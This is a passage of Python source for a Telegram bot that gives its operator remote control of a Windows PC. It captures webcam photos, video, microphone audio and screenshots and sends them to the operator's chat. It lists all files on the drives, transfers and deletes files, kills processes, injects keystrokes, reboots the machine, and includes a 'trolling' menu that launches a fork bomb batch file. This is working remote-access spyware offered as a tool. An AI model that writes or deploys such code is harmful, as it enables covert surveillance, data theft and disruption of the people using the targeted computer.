        return bot.register_next_step_handler(message, delete_file_check)

    def delete_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return delete_menu(message)

        try: os.remove(message.text.strip())
        except:
            bot.send_message(message.chat.id, '❌ Error: *file not found or access denied!*', parse_mode='Markdown')
            return delete_menu(message)
                
        bot.send_message(message.chat.id, f'☑️ The file at the path *{message.text.strip()}* was successfully deleted!', parse_mode = "Markdown")
        return delete_menu(message)


    def delete_folder(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*✍️ Enter the path to the folder you want to delete!*', parse_mode='Markdown', reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, delete_folder_check)

    def delete_folder_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return delete_menu(message)
            
        try: rmtree(message.text.strip())
        except:
            bot.send_message(message.chat.id, '❌ Error: *folder was not found or cannot be accessed!*', parse_mode='Markdown')
            return delete_menu(message)

        bot.send_message(message.chat.id, f'☑️ The folder at *{message.text.strip()}* has been deleted!', parse_mode = "Markdown")
        return delete_menu(message)


    def download_on_pc_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*⚽️ You have moved to the file upload menu!*', reply_markup=download_on_pc_menu_keyboard, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_download_on_pc)

    def check_download_on_pc(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == download_on_pc_menu_text_upload_photo:
            bot.send_message(message.chat.id, '*✍️ Enter the path where you want to save the uploaded photo\n(Example: C:\\test.jpg)*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, download_photo)

        elif message.text.strip() == download_on_pc_menu_text_upload_other:
            bot.send_message(message.chat.id, '*✍️ Enter the path where you want to save the uploaded file\n(Example: C:\\test.txt)*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, download_file_on_pc)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return download_on_pc_menu(message)


    def download_file_on_pc(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*✍️ Send the file that needs to be uploaded (up to 20 MB)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())

    def download_file_on_pc1(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
            
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        try:
            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
            bot.send_message(message.chat.id, '*☑️ Saved successfully!*', parse_mode="Markdown")
            return download_on_pc_menu(message)
        except:
            bot.send_message(message.chat.id, '*❌ Access is denied, or the file is too heavy, or the specified path does not exist!*', parse_mode="Markdown")
            return download_on_pc_menu(message)


    def download_photo(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*✍️ Send the file that needs to be uploaded (up to 20 MB)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())

    def download_photo_on_pc(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
            bot.send_message(message.chat.id, '*☑️ Successfully saved!*', parse_mode="Markdown")
            return download_on_pc_menu(message)
        
        except:
            bot.send_message(message.chat.id, '*❌ Access is denied, or the file is too heavy, or the specified path does not exist!*', parse_mode="Markdown")
            return download_on_pc_menu(message)


    def files_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*🗂 You have moved to the file menu!*', reply_markup=files_menu_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, files_menu_check)

    def files_menu_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == file_menu_edit_files:  return change_file_menu(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == file_menu_delete_files_and_folders: return delete_menu(message)
        elif message.text.strip() == file_menu_upload_file_to_pc: return download_on_pc_menu(message)
        elif message.text.strip() == file_menu_create_files_and_folders:
            bot.send_message(message.chat.id, '*✍️ Select what you need to create or go back!*', reply_markup=files_menu_check_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, check_create)

        elif message.text.strip() == file_menu_start_programm:
            bot.send_message(message.chat.id, '*✍️ Enter the file name and extension (Example: test.txt ), if the file is not from this folder, enter the full path!*', reply_markup=back_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, open_file)

        elif message.text.strip() == file_menu_download_file_by_pc:
            bot.send_message(message.chat.id, '*✍️ Enter the file name and extension (Example: test.txt ), if the file is not from this folder, enter the full path (up to 50 MB)*', reply_markup=back_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, download_file)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return files_menu(message)


    def check_create(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        if message.text.strip() == files_menu_check_text_create_folder:
            bot.send_message(message.chat.id, '*✍️ Enter the file name and extension (Example: test.txt)!*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_file)

        elif message.text.strip() == files_menu_check_text_create_folder:
            bot.send_message(message.chat.id, '*✍️ Enter the path to the new folder or just enter its name if you want to create it in the place where the script is running\n\n❗️ Example path: C:\\New folder*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_folder)

        bot.send_message(message.chat.id, wrong_choice, parse_mode="Markdown")
        return files_menu(message)

    def create_folder(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
        try: os.mkdir(message.text.strip())
        except:
            bot.send_message(message.chat.id, '❌ Error: *no access or not enough space*', parse_mode="Markdown")
            return files_menu(message)
        
        bot.send_message(message.chat.id, f'*☑️ The folder at the path "{message.text.strip()}" was successfully created!*', parse_mode="Markdown")
        return files_menu(message)


    def download_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)

        try: bot.send_document(message.chat.id, open(message.text.strip(), 'rb')) 
        except: bot.send_message(message.chat.id, '❌ Error: *no access or file does not exist*', parse_mode='Markdown')
            
        return files_menu(message)


    def open_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == "/start": return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
                
        try: os.startfile(message.text.strip())
        except: bot.send_message(message.chat.id, '❌ *File not found or access denied!*', parse_mode="Markdown")
        else: bot.send_message(message.chat.id, f'*☑️ File {message.text.strip()} launched successfully!*', parse_mode="Markdown")
        
        return files_menu(message)


    def create_msgbox(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)

        bot.send_message(message.chat.id, '❗️ *Write the text that will appear in the dialog box!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, create_msgbox_check, message.text.strip())

    def create_msgbox_check(message: types.Message, title: str):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)

        bot.send_message(message.chat.id, '❗️ *A dialog box has been created and displayed on the computer screen!*', parse_mode='Markdown')
        console_menu(message)
        result = windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)
        
        if result == 1:
            bot.send_message(message.chat.id, f'🔒 PC user decided to close the dialog box 🔒\n\nℹ️ Information about the dialog box ℹ️\n\n💬 Title: *{title}*\n📋 Content: *{message.text.strip()}*', parse_mode='Markdown')
        
        return

    def console_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '💻 *You have moved to the console menu!*', reply_markup=console_menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, console_menu_check)

    def console_menu_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == console_menu_list_process: return process_list(message)
        elif message.text.strip() == console_menu_enter_commands: 
                markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard=True).add(*CMDS, back_text, row_width=2)
                bot.send_message(message.chat.id, '🖥 *Enter the command for the console!\n\n❗️ In case of any unclear situations, enter /start*', reply_markup=markup, parse_mode='Markdown')
                return bot.register_next_step_handler(message, console_commands)

        elif message.text.strip() == console_menu_screenshot: return screenshot(message)

        elif message.text.strip() == console_menu_webcam:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite('webcam.png', frame)
                    cap.release()
                    bot.send_photo(message.chat.id, open("webcam.png", "rb"))
                    os.remove("webcam.png")
                    return console_menu(message)
                else:
                    bot.send_message(message.chat.id, "*❌ Failed to receive image from webcam*", parse_mode='Markdown')
            except Exception as e:
                print(e)
                bot.send_message(message.chat.id, "*❌ An error occurred while using the webcam*", parse_mode='Markdown')
                return console_menu(message)

        elif message.text.strip() == console_menu_webvideocam: return webvideocam(message)

        elif message.text.strip() == console_menu_microphone: return process_record_quest(message)

        elif message.text.strip() == console_menu_check_directories: return check_directories(message)
        elif message.text.strip() == console_menu_create_msgbox:
            bot.send_message(message.chat.id, '❗️ *Enter a title for the dialog box!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_msgbox)

        elif message.text.strip() == console_menu_start_python_script:
            bot.send_message(message.chat.id, '❗️ *Enter script path!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, python_scripts)

        elif message.text.strip() == console_menu_open_site:
            bot.send_message(message.chat.id, '✍️ *Enter the website address! (if you enter an address without specifying the https protocol, the sites will open only in the IE browser (Internet Explorer); to open in another browser, add the HTTPS protocol to the link)*\n\nExamples:\nhttps://resppl.ru - in this case, the site will be opened in the Yandex or Google browser.\nresppl.ru - in this case, the site will be opened only in the Internet Explorer browser.', reply_markup=back_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, open_site)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return console_menu(message)

    def screenshot(message: types.Message):
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))
            return console_menu(message)

        except PermissionError:
            bot.send_message(message.chat.id, '❌ *The bot does not have enough rights!*', parse_mode='Markdown')
            return console_menu(message)
        
    def screen(message: types.Message):
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))

        except PermissionError:
            bot.send_message(message.chat.id, '❌ *The bot does not have enough rights!*', parse_mode='Markdown')

    def webvideocam(message: types.Message):
        if is_access_denied(message.from_user):
            return None

        bot.send_message(message.chat.id, "🕒 Specify the recording duration in seconds to more accurately determine its duration. Maximum video length - 60 seconds", reply_markup=back_keyboard)
        bot.register_next_step_handler(message, webvideocam_process)

    def webvideocam_process(message: types.Message):
        if is_access_denied(message.from_user):
            return None

        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            duration = int(message.text)

            if duration > 60:
                bot.send_message(message.chat.id, "The maximum video length is 60 seconds. Please enter a value up to 60.")
                return webvideocam(message)

            cap = cv2.VideoCapture(0)
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0)
            cap.set(cv2.CAP_PROP_EXPOSURE, -4)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

            out = cv2.VideoWriter('output.avi', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (1280, 720))

            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break

            cap.release()
            out.release()

            with open('output.avi', 'rb') as video_file:
                bot.send_video(message.chat.id, video_file)

            try:
                os.remove("output.avi")
                return console_menu(message)
            except Exception as e:
                bot.send_message(message.chat.id, f"Error when deleting temporary file: {e}")
                return console_menu(message)

        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {e}.")
            return console_menu(message)
        
    def check_directories(message: types.Message):
        if is_access_denied(message.from_user): return None

        bot.send_message(message.chat.id, '*You have gone to the directory section of your computer, select the action you want to perform.*', reply_markup=directories_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, check_directories_status)

    def check_directories_status(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == directories_check_all_directories: return check_all_directories(message)
        elif message.text.strip() == directories_search_directories: return search_directories(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return check_directories(message)

    def check_all_directories(message: types.Message):
        if is_access_denied(message.from_user): return None

        bot.send_message(message.chat.id, '*🕒 The process of unloading directories on all disks can take up to 5 minutes. ⏳*', reply_markup=back_keyboard, parse_mode="Markdown")
        
        drives = ['C:\\', 'D:\\', 'E:\\']
        file_list = ""

        for path in drives:
            if os.path.exists(path):
                try:
                    file_list += f"📁 Disk {path}"
                    file_list += list_files(path)
                except Exception as e:
                    bot.send_message(message.chat.id, f"Error: str{e}.")
        
        with open("file_list.txt", "w", encoding='utf-8') as file:
            file.write(file_list)
        
        with open("file_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)    
        try:
            os.remove("file_list.txt")
        except PermissionError:
            pass
        
        return check_directories(message)

    def search_directories(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, "📂 *Enter the path to the directory you want to search in:*", reply_markup=back_keyboard, parse_mode='Markdown')
        bot.register_next_step_handler(message, search_directory)

    def search_directory(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)

        path = message.text.strip()
        
        if os.path.exists(path):
            file_list = list_files(path)
            with open("file_list.txt", "w") as file:
                file.write(file_list)
            with open("file_list.txt", "rb") as file:
                bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, "*The file with the list of files and folders was successfully transferred. 📁📩*", parse_mode='Markdown')
            try:
                os.remove("file_list.txt")
            except PermissionError:
                pass
            return check_directories(message)
        else:
            bot.send_message(message.chat.id, "*The specified path does not exist. Please enter a valid path.*", parse_mode='Markdown')
            return check_directories(message)

    def process_record_quest(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, '*🕒 Specify the recording duration in seconds to more accurately determine its duration. The maximum duration of audio recording is 60 seconds.*', reply_markup=back_keyboard, parse_mode='Markdown')
        bot.register_next_step_handler(message, process_record_duration)

    def process_record_duration(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            record_seconds = int(message.text)
            if record_seconds > 60:
                bot.send_message(message.chat.id, "The maximum video length is 60 seconds. Please enter a value up to 60.")
                return webvideocam(message)
            audio_file = open(record_audio(record_seconds), 'rb')
            bot.send_audio(message.chat.id, audio_file)
            audio_file.close()
            os.remove(audio_file.name)
        except ValueError:
            bot.send_message(message.chat.id, '🕒 Please enter a number for the recording duration in seconds.', parse_mode='Markdown')
            
        return console_menu(message)

    def process_list(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        processes = 'Список процессов:\n\n'
        for i in psutil.pids():
            try: processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'    
            except: continue
                    
        if os.path.exists('C:\\temp\\') == False: make_temp_folder()

        bot.send_message(message.chat.id, f'☑️ The list of processes has been *saved to the file below*!\n\nEnter *process ID* to destroy or *click on the "Back" button*', parse_mode = "Markdown")
        with open("C:\\temp\\processes.txt", "w", encoding="utf-8") as file: file.write(processes)

        bot.send_document(message.chat.id, document = open('C:\\temp\\processes.txt', 'rb'), reply_markup=back_keyboard)
        os.remove('C:\\temp\\processes.txt')
        return bot.register_next_step_handler(message, check_process_list)

    def check_process_list(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip().isdigit() == False:
            bot.send_message(message.chat.id, '❌ *An error has occurred! Process ID must be a number*', parse_mode='Markdown')
            return console_menu(message)
            
        kill_id = int(message.text.strip())
        parent = psutil.Process(kill_id)

        try:
            for child in parent.children(recursive=True): child.kill()
            parent.kill()
            
        except psutil.NoSuchProcess: bot.send_message(message.chat.id, '❌ *An error has occurred! There is no process with this ID*', parse_mode='Markdown')
        except psutil.AccessDenied: bot.send_message(message.chat.id, '❌ *An error has occurred! There are not enough rights to kill this process*', parse_mode='Markdown')
        finally: bot.send_message(message.chat.id, f'☑️ Process with ID *{kill_id}* was successfully killed!', parse_mode = "Markdown")
        return console_menu(message)


    def open_site(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        webopen(message.text.strip(), new=2)
        bot.send_message(message.chat.id, f'☑️ *You have successfully opened {message.text.strip()}*', parse_mode='Markdown')
        screen(message)
        return console_menu(message)


    def media_keys(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '⌨️ *You have moved to the media keys menu!*', reply_markup=media_keys_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, media_keys_check)

    def media_keys_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == media_keys_text_start_or_pause: keyboard.send('play/pause media')

        return media_keys(message)

    def keyboard_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '⌨️ *You have moved to the keyboard menu!*', reply_markup=menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_check)

    def keyboard_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == keys_menu_write: return keyboard_write(message)
        elif message.text.strip() == keys_menu_press_keys: return keyboard_keys(message)
        elif message.text.strip() == keys_menu_media_keys: return media_keys(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return keyboard_menu(message)

    def keyboard_write(message: types.Message):
        if is_access_denied(message.from_user): return None

        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*KEYS, back_text, row_width=2)
        bot.send_message(message.chat.id, '⌨️ *Type what you want to write using the keyboard, or select hotkeys from the list below!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_write_check)

    def keyboard_write_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() in KEYS: keyboard.press(message.text.strip())
        else: keyboard.write(message.text.strip(), delay=0.2)

        return keyboard_write(message)

    def keyboard_keys(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*KEYS, back_text, row_width=2)
        bot.send_message(message.chat.id, '⌨️ *Enter or select below what you want to do!\n\nExamples:\nalt - only alt will be pressed\nalt+f4 - alt and f4 will be pressed together*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_keys_check)

    def keyboard_keys_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try: keyboard.send(message.text.strip())
        except ValueError: bot.send_message(message.chat.id, '❌ *One or more of the keys were not found!*', parse_mode='Markdown')
        
        return keyboard_keys(message)

    def other_functions(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '🔑 *Select the function you want!*', reply_markup=specfunc_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_other)


    def check_other(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == specfunc_menu_delete_script_by_folders: return full_delete(message)
        elif message.text.strip() == specfunc_menu_logout_script: return script_exit(message)
        elif message.text.strip() == specfunc_menu_logout_your_account: return logout(message)
        elif message.text.strip() == specfunc_menu_restart_pc: return reboot(message)
        elif message.text.strip() == specfunc_menu_turn_off_pc: return off_computer(message)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return other_functions(message)

    def reboot(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '😢 *Confirm PC reboot!*', reply_markup=reboot_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, reboot_check)

    def reboot_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '☑️ *You have successfully caused a PC reboot\nIt will happen after redirecting to the main menu*', parse_mode='Markdown')
            mainmenu(message)
            bot.send_message(message.chat.id, "☑️ *Reboot started!*", parse_mode='Markdown')
            subprocess.run('shutdown -r -t 0')
            time.sleep(30)
            bot.send_message(message.chat.id, "❌ *Based on the information received by our system, it was discovered that the computer was not restarted. This may have happened because one of the processes was not terminated and the user was able to cancel the restart.*", parse_mode='Markdown')
            return mainmenu(message)
        bot.send_message(message.chat.id, '🎉 *You have canceled the PC reboot!*', parse_mode='Markdown')
        return other_functions(message)

    def off_computer(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '😢 *Confirm PC shutdown!*', reply_markup=off_computer_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, off_computer_check)

    def off_computer_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '☑️ *You have successfully shut down your PC\nIt will happen after redirecting to the main menu*', parse_mode='Markdown')
            mainmenu(message)
            subprocess.Popen('shutdown /s /t 0', shell=True)
            time.sleep(30)
            bot.send_message(message.chat.id, "❌ *Based on the information received by our system, it was discovered that the computer was not turned off. This may have happened because one of the processes was not terminated and the user was able to cancel the shutdown.*", parse_mode='Markdown')
            return mainmenu(message)

        bot.send_message(message.chat.id, '🎉 *You have canceled the PC shutdown!*', parse_mode='Markdown')
        return other_functions(message)


    def logout(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '😢 *Confirm logging out of your account!*', reply_markup=logout_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, logout_check)

    def logout_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '☑️ *You have successfully signed out of your account*', parse_mode='Markdown')
            return subprocess.run('shutdown /l')

        bot.send_message(message.chat.id, '🎉 *You have canceled your account logout!*', parse_mode='Markdown')
        return other_functions(message)


    def script_exit(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '😢 *Confirm turning off the script!*', reply_markup=script_exit_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_exit)

    def check_exit(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '😥 *You have completed the script!*', parse_mode='Markdown')
            return os.abort()

        bot.send_message(message.chat.id, '🎉 *You canceled the script termination!*', parse_mode='Markdown')
        return other_functions(message)

    def packs(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '👺 *You have moved to the trolling menu!*', reply_markup=packs_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_packs)

    def check_packs(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == packs_menu_open_cmds:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            with open("C:\\temp\\troll.bat", "w") as file: file.write('start %0 %0')
            os.startfile("C:\\temp\\troll.bat")
            bot.send_message(message.chat.id, f'☑️ {packs_menu_open_cmds} launched successfully!*', parse_mode='Markdown')
            return packs(message)

        elif message.text.strip() == packs_menu_open_sites:
            bot.send_message(message.chat.id, '✍️ *Enter the sites you want to open, separated by commas! (if you enter an address without specifying the https protocol, the sites will open only in the IE browser (Internet Explorer); to open in another browser, add the HTTPS protocol to the link)*\n\nExamples:\nhttps://resppl.ru - in this case, the site will be opened in the Yandex or Google browser.\nresppl.ru - in this case, the site will be opened only in the Internet Explorer browser.', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, troll_website)
        elif message.text.strip() == packs_menu_open_conductors:
            bot.send_message(message.chat.id, '✍️ *Enter how many times you want to open explorer!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, troll_provod)
        elif message.text.strip() == packs_menu_moving_mouse:
            bot.send_message(message.chat.id, '✍️ *Enter how many seconds you want to move the mouse!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, mouse_troll)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return packs(message)

    def mouse_troll(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        xmouse = message.text.strip()
        if xmouse == "/start": return start(message)
        if xmouse == back_text: return packs(message)
        if xmouse.isdigit() == False:
            bot.send_message(message.chat.id, f'❌ *The number of times must be a number!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'☑️ *Please note that the script has started running. Please be aware that a script completion notification will be sent to you upon completion of the process.*', parse_mode='Markdown')
        
        for i in range(int(xmouse)): 
            for i in range(10): pyautogui.moveTo(randint(0, width), randint(0, height), duration=0.10)
        
        bot.send_message(message.chat.id, '☑️ *The script to move the mouse was successfully executed!*', parse_mode='Markdown')
        return packs(message)

    def troll_provod(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        xexplorer = message.text.strip()
        if xexplorer == "/start": return start(message)
        if xexplorer == back_text: return packs(message)
        if xexplorer.isdigit() == False:
            bot.send_message(message.chat.id, f'❌ *The number of times must be a number!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'☑️ *Please note that the script has started running. Please be aware that a script completion notification will be sent to you upon completion of the process.*', parse_mode='Markdown')

        for i in range(int(xexplorer)): keyboard.send("win+e")
        bot.send_message(message.chat.id, '☑️ *The script to open Explorer was executed successfully!*', parse_mode='Markdown')
        return packs(message)

    def troll_website(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return packs(message)

        websites = message.text.strip().split(',')
        websites = [site.strip() for site in websites]

        bot.send_message(message.chat.id, f'✍️ *Enter how many times you want to open the specified sites!*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_open_websites, websites_list=websites)

    def troll_open_websites(message: types.Message, websites_list: List[str]):
        if is_access_denied(message.from_user): return None
        
        xsite = message.text.strip()
        if xsite == "/start": return start(message)
        elif message.text.strip() == back_text: return packs(message)
        if not xsite.isdigit():
            bot.send_message(message.chat.id, f'❌ *The number of times must be a number!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'☑️ *Please note that the script has started running. Please be aware that a script completion notification will be sent to you upon completion of the process.*', parse_mode='Markdown')

        for _ in range(int(xsite)):
            for site in websites_list:
                webopen(site, new=1)

        bot.send_message(message.chat.id, '☑️ *The script for opening sites was successfully executed!*', parse_mode='Markdown')
        return packs(message)

    def full_delete(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
        return bot.register_next_step_handler(message, full_delete_open)

    def full_delete_open(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == "/start": return start(message)
        if os.path.exists('C:\\temp') == False: make_temp_folder()
        with open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8") as file: file.write(message.text.strip())
        subprocess.Popen("python C:\\temp\\DeleteFile.py", shell=True)
        return other_functions(message)

    class Sound:
        """
        Class Sound
        :author: Paradoxis <luke@paradoxis.nl>
        :description:

        Allows you control the Windows volume
        The first time a sound method is called, the system volume is fully reset.
        This triggers sound and mute tracking.
        """

        # Current volume, we will set this to 100 once initialized
        __current_volume = None

        @staticmethod
        def current_volume():
            """
            Current volume getter
            :return: int
            """
